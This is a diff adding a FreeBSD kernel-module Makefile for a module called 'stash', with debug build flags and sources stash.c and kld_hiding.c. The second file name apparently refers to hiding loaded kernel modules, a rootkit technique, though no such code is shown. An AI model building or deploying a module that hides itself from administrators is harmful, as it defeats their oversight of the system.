@@ -1,0 +1,14 @@
+.PATH: ${.CURDIR}/src/
+.OBJDIR: ${.CURDIR}/obj/
+PACKAGE=stash
+# START DEBUG MODE
+DEBUG_FLAGS=-g
+COPTFLAGS=-O0
+CFLAGS=-O0 -pipe
+CFLAGS+=-DDEBUG
+# END DEBUG MODE
+FILESDIR=.
+KMOD=stash
+SRCS=stash.c kld_hiding.c
+
+.include <bsd.kmod.mk>
